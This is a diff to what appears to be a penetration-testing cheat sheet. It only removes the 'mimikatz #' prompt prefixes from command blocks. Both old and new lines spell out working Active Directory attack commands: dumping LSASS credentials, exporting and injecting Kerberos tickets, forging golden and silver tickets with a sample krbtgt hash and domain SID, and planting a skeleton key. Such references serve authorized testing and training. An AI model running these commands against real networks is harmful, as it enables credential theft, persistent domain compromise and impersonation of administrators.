@@ -2381,7 +2381,7 @@ laZagne.exe all
 ##### Dump Hshes
 
 ```c
-mimikatz.exe
+.\mimikatz.exe
 sekurlsa::minidump /users/admin/Desktop/lsass.DMP
 sekurlsa::LogonPasswords
 meterpreter > getprivs
@@ -2393,8 +2393,8 @@ meterpreter > golden_ticket_create
 
 ```c
 .\mimikatz.exe
-mimikatz # sekurlsa::tickets /export
-mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
+sekurlsa::tickets /export
+kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
 klist
 dir \\<RHOST>\admin$
 ```
@@ -2402,11 +2402,11 @@ dir \\<RHOST>\admin$
 ##### Forging Golden Ticket
 
 ```c
-C:\> .\mimikatz.exe
-mimikatz # privilege::debug
-mimikatz # lsadump::lsa /inject /name:krbtgt
-mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
-mimikatz # misc::cmd
+.\mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
+misc::cmd
 klist
 dir \\<RHOST>\admin$
 ```
@@ -2414,8 +2414,8 @@ dir \\<RHOST>\admin$
 ##### Skeleton Key
 
 ```c
-mimikatz # privilege::debug
-mimikatz # misc::skeleton
+privilege::debug
+misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 ```
@@ -3011,7 +3011,7 @@ cp tickey /tmp/tickey
 ###### Harvest Tickets from Windows
 
 ```c
-mimikatz # sekurlsa::tickets /export
+sekurlsa::tickets /export
 .\Rubeus dump
 ```
 
@@ -3049,7 +3049,7 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ###### Inject Ticket with mimikatz
 
 ```c
-mimikatz # kerberos::ptt <KIRBI_FILE>
+kerberos::ptt <KIRBI_FILE>
 ```
 
 ###### Inject Ticket with Rubeus
@@ -3099,25 +3099,25 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ###### Generate TGS with NTLM
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Generate TGS with AES 128bit Key
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
 ```
 
 ###### Inject TGS with Mimikatz
 
 ```c
-mimikatz # kerberos::ptt <KIRBI_FILE>
+kerberos::ptt <KIRBI_FILE>
 ```
 
 ##### Rubeus Examples
@@ -3167,25 +3167,25 @@ impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 ###### Generate TGT with NTLM
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 128bit Key
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
 ```
 
 ###### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)
 
 ```c
-mimikatz # kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
+kerberos::golden /domain:<DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
 ```
 
 ###### Inject TGT with Mimikatz
 
 ```c
-mimikatz # kerberos::ptt <KIRBI_FILE>
+kerberos::ptt <KIRBI_FILE>
 ```
 
 ##### Rubeus Examples
